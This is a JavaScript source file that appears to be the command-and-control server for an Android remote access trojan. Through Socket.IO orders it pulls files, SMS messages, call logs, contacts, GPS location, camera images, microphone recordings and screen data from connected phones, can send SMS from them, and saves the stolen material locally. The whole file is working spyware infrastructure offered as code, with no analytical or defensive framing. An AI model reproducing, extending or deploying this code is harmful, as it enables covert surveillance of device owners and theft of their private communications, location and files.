const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const readline = require('readline');
const fs = require('fs');
const { buffer } = require('stream/consumers');
const path = require('path');
const chalk = require('chalk');
const e = require('express');
const no = null; // Number
const msg = null; // Message

// File transfer sessions
const filesInProgress = {};

// Utility function to ensure consistent forward-slash paths
const posixPathJoin = (...segments) => segments.join('/').replace(/\/+/g, '/');

// Initial path
let pathValue = '/storage/emulated/0';

// Set up the Express app and HTTP server
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    pingInterval: 25000, // Adjust ping interval
    pingTimeout: 300000, // 5 minutes
    maxHttpBufferSize: 1e8, // 100 MB
});

// Set up the readline interface for user input
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

// Store connected clients
const clients = [];

// Function to prompt user for commands
function promptUser() {
    if (clients.length > 0) {
        rl.question('> ', (input) => {
            const [command, ...extraParts] = input.trim().split(/\s+/) // Get command and extra
            const extra = extraParts.join(' ');

            if (command === 'sendSMS') {
                rl.question('Enter the number: ', (number) => {
                    rl.question('Enter the message: ', (message) => {
                        sendCommand(command, { number, message });
                        promptUser();
                    });
                });
            }
            else if (command) {
                sendCommand(command, extra); // Send the command with optional "extra"
                promptUser(); // Continue prompting for commands
            }
            else {
                console.log('Invalid command format. Use command:extra.');
            }
            promptUser(); // Continue prompting for commands
        });
    } else {
        console.log('No clients connected. Waiting for a connection...');
    }
}




// Listen for client connections
io.on('connection', (socket) => {
    console.log('New client connected: ', socket.id);
    console.log('Client IP:', socket.handshake.address);

    // Add the client to the list
    clients.push(socket);

    // Start prompting for commands if the first client connects
    if (clients.length === 1) {
        promptUser();
    }

    socket.on('pong', (data) => {
        console.log(data);
    })

    socket.on('info', (data) => {
        if (data) {
            console.table(data);
        }
    })


    socket.on('x0000pull', (data) => {
        try {
            const { name, chunkIndex, totalChunks, buffer } = data;

            if (!filesInProgress[name]) {
                filesInProgress[name] = {
                    writeStream: fs.createWriteStream(path.join(__dirname, 'uploads', name), { flags: 'a' }),
                    receivedChunk: 0,
                };
            }

            const { writeStream } = filesInProgress[name];
            writeStream.setMaxListeners(100000);

            writeStream.write(Buffer.from(buffer), (err) => {
                if (err) {
                    console.error(`Error writing chunk ${+ 1} for file ${name}: ${err.message}`);
                    return;
                }

                filesInProgress[name].receivedChunk++;

                console.log(`Received chunk ${chunkIndex + 1}/${totalChunks} for file ${name} at received chunk ${filesInProgress[name].receivedChunk}`);

                if (filesInProgress[name].receivedChunk === totalChunks) {
                    writeStream.end(() => {
                        console.log(`File ${name} uploaded successfully!`);
                    });
                    delete filesInProgress[name];
                }
            });
            writeStream.on('error', (err) => {
                console.error(`Error writing chunk ${+ 1} for file ${name}: ${err.message}`);
            });
        } catch (error) {
            console.error(`Error processing chunk for file ${data.name}: ${err.message}`);
        }
    })


    const downloadDir = path.join(__dirname, "downloads");
    if (!fs.existsSync(downloadDir)) fs.mkdirSync(downloadDir);

    socket.on('x0000All', (data) => {
        try {
            if (Array.isArray(data)) {
                data.forEach((file, index) => {
                    handleFiles(file, `file_${index}`);
                });
            }
            else if (data.isDownload && data.buffer) {
                handleFiles(data, data.name || `file_${Date.now()}`);
            } else {
                console.error("Invalid data format received:", data);
            }
        } catch (err) {
            console.error("Error handling incoming file data:", err);
        }
    });

    function handleFiles(file, defaultName) {
        try {
            const fileName = file.name || defaultName;
            const filePath = path.join(downloadDir, fileName);

            const fileBuffer = Buffer.isBuffer(file.buffer) ? file.buffer
                : Buffer.from(file.buffer, 'base64');

            fs.writeFile(filePath, fileBuffer, (err) => {
                if (err) {
                    console.error(`Error saving file ${fileName}:`, err);
                } else {
                    console.log(`File saved: ${fileName}`);
                }
            });
        } catch (err) {
            console.error("Error while saving file:", err);
        }
    }


    socket.on('x0000fm', (data) => {
        if (Array.isArray(data) || data.file) {
            console.log('File list received:');
            data.forEach(item => {
                const formattedName = chalk.blue(item.name.padEnd(60, ' '));
                const size = item.fileSize
                    ? chalk.yellow(`${(item.fileSize / (1024 * 1024)).toFixed(2)} MB`)
                    : chalk.red('Unknown');
                console.log(`${formattedName} ${chalk.green('size:')} ${size}`);
            });
        } else {
            console.error('Invalid file data received.');
        }
    });




    socket.on('x0000ca', (data) => {
        if (data) {
            if (data) {
                // process and save the image
                const imageBuffer = Buffer.from(data);
                saveImage(imageBuffer);
            }
            else if (data.list && Array.isArray(data.list)) {
                console.table(data.list.map((cam) => ({
                    'Camera Name': cam.name,
                    'CameraID': cam.id,
                })))
            }
            else {
                console.log('Invalid camera data received:', data);
            }
        }
    });


    socket.on('x0000lm', (data) => {
        if (data && data.enable) {
            console.log(`Latitude: ${data.lat}, Longitude: ${data.lng}`);
            console.log(`View Map: https://www.google.com/maps/search/?api=1&query=${data.lat},${data.lng};
`)
        } else {
            console.log('Invalid location data received:', data);
        }
    });

    socket.on('x0000sm', (data) => {
        if (data) {
            logToFile(data, `Messages${Date.now()}.txt`);
        } else {
            console.log('Invalid messages data received:', data);
        }
    });

    socket.on('x0000cl', (data) => {
        if (data) {
            logToFile(data, `CallLogs_${Date.now()}.txt`);
        } else {
            console.log('Invalid call log data received:', data);
        }
    });

    socket.on('x0000cn', (data) => {
        if (data) {
            logToFile(data, 'contacts.vcf');
        } else {
            console.log('Invalid contacts data received:', data);
        }
    });

    socket.on('x0000mc', (data) => {
        if (data.file && data.buffer) {
            try {
                const fileBuffer = Buffer.from(data.buffer);
                saveFile(fileBuffer, 'rec_' + Date.now() + '.mp3');
            } catch (err) {
                console.log('Error saving file: ', err);
            }
        }
        else {
            console.log('Invalid file received from client.');
        }
    });

    socket.on('x0000co', (data) => {
        if (data) {
            console.log(data)
        }
    })

    socket.on('update', (data) => {
        if (data) {
            console.log(data);
        }
    });

    socket.on('x0000screen', (data) => {
        if (data) {
            console.log(data);
        }
    })
    socket.on('x0000pm', (data) => {
        if (data) {
            for (let i = 0; i < data.length; i++) {
                console.log(data[i]);
            }
        }
    })


    socket.on('disconnect', (reason) => {
        console.log(`Client disconnected: ${socket.id}, Reason: ${reason}`);

        const index = clients.indexOf(socket);
        if (index !== -1) clients.splice(index, 1);

        if (clients.length === 0) {
            console.log('All clients disconnected. Pausing user input.');
        }
    });
});



// Function to save the iamge
function saveImage(buffer) {
    const imagePath = path.join(__dirname, "downloads", `image_${Date.now()}.jpg`);
    fs.writeFile(imagePath, buffer, (err) => {
        if (err) console.error('Error saving image: ', err);
        else console.log('Image saved to:', imagePath);
    });
}

// Function to save the file
function saveFile(data, fileName) {
    const downloadDir = path.join(__dirname, "downloads");
    if (!fs.existsSync(downloadDir)) fs.mkdirSync(downloadDir);

    const downloadedFilePath = path.join(downloadDir, fileName || `file_${Date.now}`);
    fs.writeFile(downloadedFilePath, data, (err) => {
        if (err) console.error('Error saving file: ', err);
        else console.log('File saved to:', downloadedFilePath);
    });
}




// Function to write data to a file with a timestamp
function logToFile(data, fileName) {
    // Get the current timestamp
    const timestamp = new Date().toISOString();

    // Format the log entry
    const logEntry = `[${timestamp}] ${JSON.stringify(data, null, 2)}\n`;

    // Define the log file path (e.g., "logs.txt" in the current directory)
    const logFilePath = path.join(__dirname, "downloads", fileName);

    // Append the log entry to the file
    fs.appendFile(logFilePath, logEntry, (err) => {
        if (err) {
            console.error('Error writing to log file:', err);
        } else {
            console.log('Log entry written to file');
        }
    });
}





// Function to send commands to all clients
function sendCommand(command, extra) {
    let order = '';
    let payload = {};

    switch (command) {
        case 'screen':
            if (!extra) {
                console.log("Please pass an argument.");
                return;
            }
            order = 'x0000screen'
            payload = { order, extra: extra };
            break;
        case 'info':
            order = 'info';
            payload = { order };
            break;
        case 'ping':
            order = 'ping';
            payload = { order };
            break;
        case 'cls':
            console.clear();
            break;

        case 'ls':
            order = 'x0000fm';
            payload = { order, extra: 'ls', path: pathValue };
            break;

        case 'pull':
            if (!extra) {
                console.log('No file specified to pull.');
                return;
            }
            order = 'x0000pull';
            payload = { order, filePath: posixPathJoin(pathValue, extra) };
            break;
        case 'dump':
            if (!extra) {
                console.log('Path required');
                return;
            }
            order = 'x0000dump';
            payload = { order, filePath: posixPathJoin(pathValue, extra) };
            break;
        case 'update':
            if (!extra) {
                console.log("No argument specified.");
                return;
            }
            order = 'update';
            payload = { order, extra: extra };
            break;
        case 'system':
            if (!extra) {
                console.log("Please specify your intention");
                return;
            }
            order = 'system';
            payload = { order, extra: extra };
            break;

        case 'smsList':
            order = 'x0000sm';
            payload = { order, extra: 'ls' };
            break;
        case 'sendSMS':
            order = 'x0000sm';
            payload = { order, extra: extra };
            break;
        case 'cd':
            if (!extra) {
                console.log('No path specified for "cd".');
                return;
            }
            if (extra === '..') {
                const parts = pathValue.split('/');
                parts.pop(); // Remove the last directory
                pathValue = parts.join('/') || '/';
            } else {
                pathValue = posixPathJoin(pathValue, extra);
            }
            console.log(`Path changed to: ${pathValue}`);
            return; // No need to send a command for "cd"

        case 'camList':
            order = 'x0000ca';
            payload = { order, extra: 'camList' };
            break;
        case 'cam0':
            order = 'x0000ca';
            payload = { order, extra: 0 };
            break;
        case 'cam1':
            order = 'x0000ca';
            payload = { order, extra: 1 };
            break;
        case 'locate':
            order = 'x0000lm';
            payload = { order };
            break;
        case 'calls':
            order = 'x0000cl';
            payload = { order };
            break;
        case 'contacts':
            order = 'x0000cn';
            payload = { order };
            break;
        case 'permissions':
            order = 'x0000pm';
            payload = { order };
            break;
        case 'record':
            if (!extra) {
                console.log('No duration specified to record.')
                break;
            }
            order = 'x0000mc';
            payload = { order, extra: extra };
            break;
        case 'local':
            localxp();
        default:
            console.log('Unknown command:', command);
            return;
    }

    clients.forEach(client => {
        client.emit('order', payload);
    });
}

// Start the server on a specified port
const PORT = process.env.PORT || 43664;
server.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
